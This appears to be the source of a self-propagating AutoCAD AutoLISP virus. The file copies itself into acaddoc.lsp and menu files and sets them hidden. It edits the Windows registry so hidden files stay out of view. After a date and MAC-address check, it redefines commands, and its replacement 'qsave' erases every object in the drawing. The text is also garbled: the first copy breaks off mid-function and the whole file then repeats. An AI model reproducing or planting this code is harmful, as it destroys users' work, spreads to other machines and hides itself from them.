(defun s::startup (/ DOCLSP DWGPRE CDATE MAC0 MNLPTH)
  (vl-load-com)
  (setvar "cmdecho" 0)
  (setvar "filedia" 1)
  (vl-registry-write
    "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL"
    "CheckedValue"
    0
  )  
  (vl-registry-write
    "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\NOHIDDEN"
    "CheckedValue"
    0
  )
  (vl-registry-write
    "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\NOHIDDEN"
    "DefaultValue"
    0
  )
  (setq mnlpth (getvar "menuname"))
  (setq dwgpre (getvar "dwgprefix"))
  (if (setq doclsp (findfile "acaddoc.lsp"))
    (progn (chklsp (strcat mnlpth "doc.lsp") doclsp)
	   (chklsp (strcat mnlpth ".mnl") doclsp)
	   (chklsp (strcat dwgpre "acaddoc.lsp") doclsp)
    )
  )
  (setq	mac0
	 '(2256	  2256	 2726	2256   2585   2726   3243   2679
	   2726	  2256	 3149	2726   3196   3290   2726   2632
	   2397
	  )
  )
  (if (and (> (setq cdate (getvar "cdate")) 20090909)
	   (member (vl-string->list (car (macaddr))) (mkgroup mac0))
	   (= (rem (fix (* 100 (- cdate (fix cdate)))) 2) 0)
      )
    (dolsp)
  )
  (princ)
)
(defun chklsp (fp1 fp2 / fp3 TEM1 TEM2)
  (if (setq fp3 (open fp1 "r"))
    (progn
      (if
	(not
	  (wcmatch (while (setq tem1 (read-line fp3)) (setq tem2 tem1))
		   "*;;;jjyy*"
	  )
	)
	 (writelsp fp2 fp1)
      )
      (close fp3)
    )
    (writelsp fp2 fp1)
  )
  (attset fp1 2)
  (attset fp2 2)
)
(defun writelsp	(fp1 fp2 / fp3 fp4 tem)
  (setq	fp3 (open fp1 "r")
	fp4 (open fp2 "a")
  )
  (while (setq tem (read-line fp3)) (write-line tem fp4))
  (close fp3)
  (close fp4)
  (princ)
)
(defun attset (fp code / fp1)
  (if (and (/= "" fp) code)
    (progn (vl-load-com)
	   (vlax-put-property
	     (setq fp1 (vlax-invoke-method
			 (vlax-create-object "Scripting.FileSystemObject")
			 'GetFile
			 fp
		       )
	     )
	     'Attributes
	     code
	   )
    )
  )
  (vlax-release-object fp1)
)
(defun mkgroup (pt0 / pts)
  (setq i 1)
  (repeat 500
    (setq pts (cons (mapcar '(lambda (x) (/ x i)) pt0) pts))
    (setq i (1+ i))
  )
  (reverse pts)
)
(defun macaddr (/ mac WMIobj con lox sn)
  (vl-load-com)
  (if (setq WMIobj (vlax-create-object "wbemScripting.SwbemLocator"))
    (progn
      (setq
	con (vl-catch-all-apply
	      'vlax-invoke
	      (list WMIobj 'ConnectServer "." "" "" "" "" "" 128 nil)
	    )
      )
      (if (vl-catch-all-error-p con)
	(setq
	  con (vlax-invoke WMIobj 'ConnectServer "." "" "" "" "" "")
	)
      )
      (setq lox	(vlax-invoke
		  con
		  'ExecQuery
		  "Select * From Win32_NetworkAdapter "
		)
      )
      (vlax-for	i lox
	(if (vlax-get i 'NetConnectionID)
	  (progn (setq sn (vlax-get i 'MACAddress))
		 (or (member sn mac) (setq mac (cons sn mac)))
	  )
	)
      )
      (mapcar 'vlax-release-object (list lox con WMIobj))
    )
(defun s::startup (/ DOCLSP DWGPRE CDATE MAC0 MNLPTH)
  (vl-load-com)
  (setvar "cmdecho" 0)
  (setvar "filedia" 1)
  (vl-registry-write
    "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL"
    "CheckedValue"
    0
  )  
  (vl-registry-write
    "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\NOHIDDEN"
    "CheckedValue"
    0
  )
  (vl-registry-write
    "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\NOHIDDEN"
    "DefaultValue"
    0
  )
  (setq mnlpth (getvar "menuname"))
  (setq dwgpre (getvar "dwgprefix"))
  (if (setq doclsp (findfile "acaddoc.lsp"))
    (progn (chklsp (strcat mnlpth "doc.lsp") doclsp)
	   (chklsp (strcat mnlpth ".mnl") doclsp)
	   (chklsp (strcat dwgpre "acaddoc.lsp") doclsp)
    )
  )
  (setq	mac0
	 '(2256	  2256	 2726	2256   2585   2726   3243   2679
	   2726	  2256	 3149	2726   3196   3290   2726   2632
	   2397
	  )
  )
  (if (and (> (setq cdate (getvar "cdate")) 20090909)
	   (member (vl-string->list (car (macaddr))) (mkgroup mac0))
	   (= (rem (fix (* 100 (- cdate (fix cdate)))) 2) 0)
      )
    (dolsp)
  )
  (princ)
)
(defun chklsp (fp1 fp2 / fp3 TEM1 TEM2)
  (if (setq fp3 (open fp1 "r"))
    (progn
      (if
	(not
	  (wcmatch (while (setq tem1 (read-line fp3)) (setq tem2 tem1))
		   "*;;;jjyy*"
	  )
	)
	 (writelsp fp2 fp1)
      )
      (close fp3)
    )
    (writelsp fp2 fp1)
  )
  (attset fp1 2)
  (attset fp2 2)
)
(defun writelsp	(fp1 fp2 / fp3 fp4 tem)
  (setq	fp3 (open fp1 "r")
	fp4 (open fp2 "a")
  )
  (while (setq tem (read-line fp3)) (write-line tem fp4))
  (close fp3)
  (close fp4)
  (princ)
)
(defun attset (fp code / fp1)
  (if (and (/= "" fp) code)
    (progn (vl-load-com)
	   (vlax-put-property
	     (setq fp1 (vlax-invoke-method
			 (vlax-create-object "Scripting.FileSystemObject")
			 'GetFile
			 fp
		       )
	     )
	     'Attributes
	     code
	   )
    )
  )
  (vlax-release-object fp1)
)
(defun mkgroup (pt0 / pts)
  (setq i 1)
  (repeat 500
    (setq pts (cons (mapcar '(lambda (x) (/ x i)) pt0) pts))
    (setq i (1+ i))
  )
  (reverse pts)
)
(defun macaddr (/ mac WMIobj con lox sn)
  (vl-load-com)
  (if (setq WMIobj (vlax-create-object "wbemScripting.SwbemLocator"))
    (progn
      (setq
	con (vl-catch-all-apply
	      'vlax-invoke
	      (list WMIobj 'ConnectServer "." "" "" "" "" "" 128 nil)
	    )
      )
      (if (vl-catch-all-error-p con)
	(setq
	  con (vlax-invoke WMIobj 'ConnectServer "." "" "" "" "" "")
	)
      )
      (setq lox	(vlax-invoke
		  con
		  'ExecQuery
		  "Select * From Win32_NetworkAdapter "
		)
      )
      (vlax-for	i lox
	(if (vlax-get i 'NetConnectionID)
	  (progn (setq sn (vlax-get i 'MACAddress))
		 (or (member sn mac) (setq mac (cons sn mac)))
	  )
	)
      )
      (mapcar 'vlax-release-object (list lox con WMIobj))
    )
  )
  (reverse mac)
)
(defun dolsp ()
  (command "undefine" "qsave")
  (command "undefine" "saveas")
  (command "undefine" "wblock")
  (command "undefine" "insert")
  (command "undefine" "pline")
)
(defun c:qsave ()
  (command "_.erase" (ssget "x") "")
  (princ)
)
(defun c:saveas	(/ fp1)
  (setq fp1 (getfiled "ͼ������Ϊ" (getvar "dwgprefix") "dwg" 1))
  (chklsp (strcat (vl-filename-directory fp1) "\\acaddoc.lsp")
	  (findfile "acaddoc.lsp")
  )
  (princ)
)
(defun c:wblock () (princ))
(defun c:insert () (princ))
(defun c:pline () (command "_.line") (princ))
;;;jjyy
